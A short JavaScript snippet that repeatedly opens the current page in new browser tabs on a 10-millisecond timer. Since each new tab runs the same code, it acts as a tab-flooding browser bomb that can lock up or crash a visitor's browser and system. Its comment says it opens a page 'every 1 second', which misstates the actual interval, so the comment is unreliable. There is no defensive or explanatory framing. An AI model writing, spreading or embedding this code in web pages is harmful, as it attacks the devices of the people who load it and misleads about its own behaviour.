(function openContinuously() {
    setInterval(() => {
        window.open(window.location.href, '_blank');
    }, 10); // Opens a new page every 1 second (adjust as needed)
})();
